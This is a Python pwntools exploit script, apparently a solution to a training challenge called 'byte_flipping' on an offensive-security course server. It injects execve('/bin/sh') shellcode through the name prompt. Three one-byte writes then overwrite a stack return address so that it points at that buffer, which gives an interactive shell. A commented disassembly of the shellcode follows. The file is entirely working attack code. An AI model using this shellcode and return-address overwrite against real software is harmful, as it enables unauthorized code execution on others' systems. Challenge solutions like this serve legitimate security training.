from pwn import *
import time

context.terminal = ['tmux', 'splitw', '-h']

if "REMOTE" not in args:
    r = process("./byte_flipping")
    gdb.attach(r, """
        b *0x4008f0
        b *0x4009cd
        c
        """)

    input("wait")
else:
    r = remote("bin.training.offdef.it", 4003)


print("[*] Welcome Message:", r.recv())

#Address of name: 0x006020a0
#name_address = b"\xa0\x20\x60\x00"

shellcode = b"\x48\xC7\xC7\xA0\x20\x60\x00\x48\x83\xC7\x17\x48\x31\xF6\x48\xC7\xC0\x3B\x00\x00\x00\x0F\x05/bin/sh\x00"
r.sendline(shellcode) #Sending shellcode when name is asked

time.sleep(0.1)

print("[*] GoodLuck Message: ", r.recv())

""" first_address = b"0x7fffffffdd78"
second_address = b"0x7fffffffdd79"
third_address = b"0x7fffffffdd7a" """

first_address = b"0x7fffffffe098"
second_address = b"0x7fffffffe099"
third_address = b"0x7fffffffe09a"


print("Before any sending")

first_value = b"0xa0"
second_value = b"0x20"
third_value = b"0x60"

""" print("1.a: ", r.recvuntil(b"\n")) """
print(r.recvuntil(b": "))
r.sendline(first_address)
print("Sent line")
time.sleep(0.1)
""" print("1.b: ", r.recvuntil(b"\n")) """
print(r.recvuntil(b": "))
r.sendline(first_value)
time.sleep(0.1)

""" print("2.a: ", r.recvuntil(b"\n")) """
print(r.recvuntil(b": "))
r.sendline(second_address)
time.sleep(0.1)
""" print("2.b: ", r.recvuntil(b"\n")) """
print(r.recvuntil(b": "))
r.sendline(second_value)
time.sleep(0.1)

""" print("3.a: ", r.recvuntil(b"\n")) """
print(r.recvuntil(b": "))
r.sendline(third_address)
time.sleep(0.1)
""" print("3.b: ", r.recvuntil(b"\n")) """
print(r.recvuntil(b": "))
r.sendline(third_value)
time.sleep(0.1)

r.interactive()

"""
0:  48 c7 c7 a0 20 60 00    mov    rdi,0x6020a0
7:  48 83 c7 17             add    rdi,0x17
b:  48 31 f6                xor    rsi,rsi
e:  48 c7 c0 3b 00 00 00    mov    rax,0x3b
15: 0f 05                   syscall
17: 00                      .byte 0x0
"""

